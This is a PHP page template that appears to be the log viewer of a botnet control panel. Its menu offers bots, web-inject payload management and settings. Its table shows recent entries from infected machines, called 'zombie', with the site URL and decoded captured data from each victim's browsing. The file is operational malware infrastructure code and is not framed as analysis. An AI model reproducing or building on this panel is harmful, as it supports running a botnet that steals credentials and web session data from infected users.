<div class="panel">
    <div class="ui pointing menu">
      <a href="index.php?action=bots" class="item">Bots</a>
      <a href="index.php?action=panel" class="active item">Logs</a>
      <a href="index.php?action=payload" class="item">Web Inject</a>
      <a href="index.php?action=listpayload" class="item">List Web Inject</a>
      <a href="index.php?action=settings" class="item">Settings</a>
      <a href="logout.php" class="item">Logout</a>
      <div class="right menu">
        <a class="item">Welcome <?php echo $_SESSION['username']; ?></a>
      </div>
    </div>
    <div class="ui segment">
      <table class="ui very basic table">
  <thead>
    <tr>
      <th>#id</th>
      <th>Name</th>
      <th>Url</th>
      <th>Logs</th>
    </tr>
  </thead>
  <tbody>
      <?php
    $logs = $bdd->prepare("SELECT * FROM logs_checker ORDER BY id DESC LIMIT 0,5");
    $logs->execute();
    while($fetch = $logs->fetch())
    {
        if(base64_decode($fetch['logs_site'], true) != ''){
            $log = base64_decode($fetch['logs_site'], true);
        }
        else{
            $log = $fetch['logs_site'];
        }
        ?>
    <tr>
      <td><?php echo $fetch['id']; ?></td>
      <td><?php echo $fetch['zombie']; ?></td>
      <td><?php echo $fetch['url_site']; ?></td>
      <td><textarea rows="3" cols="60" class="formlog"><?php echo $log; ?></textarea></td>
    </tr>
      <?php
    }
      ?>
  </tbody>
</table>
    </div>
</div>